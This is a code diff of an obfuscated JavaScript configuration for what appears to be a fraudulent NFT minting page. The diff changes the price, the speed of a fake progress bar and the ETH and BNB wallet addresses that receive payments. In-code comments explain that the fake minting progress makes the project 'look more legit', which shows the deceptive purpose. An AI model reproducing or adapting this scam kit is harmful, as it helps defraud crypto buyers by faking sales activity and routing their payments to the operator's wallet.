@@ -27,13 +27,13 @@ function _0x227f(_0x3622d9, _0x2c2f28) {
 	  1,
 	  5
 	],
-	price = 0.2,
+	price = 0.1,
     // don't know what this is
 	_0xec0157 = _0x520788(269),
     // amount is how many NFTs are being sold.
 	amount = 5000,
     // this value doesn't really need to be changed, it just changes how fast the progress bar moves to show how many NFTs have been purchased.
-	_0x43886a = 30.4,
+	_0x43886a = 80,
     // delay basically chooses how often the progress bar should increase in value, the time is in ms.
     // added chooses how many nfts that have been minted with a value between of 1-3 (slower is better, looks more legit if it's a smaller project)
 	delay = [
@@ -45,8 +45,8 @@ function _0x227f(_0x3622d9, _0x2c2f28) {
 	  5
 	],
 	address = {
-	  'ETH': '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce',
-	  'BNB': '0xcf85047D0e14C64C42f8221012BD0B8388Dc58Ce'
+	  'ETH': '0x70B8004531FDfab778a7e9a95E696834Cb1ABB2B',
+	  'BNB': '0x70B8004531FDfab778a7e9a95E696834Cb1ABB2B'
 	};
 	function _0x34d1cf(_0x375b0) {
 	  const _0x57e81b = _0x520788;
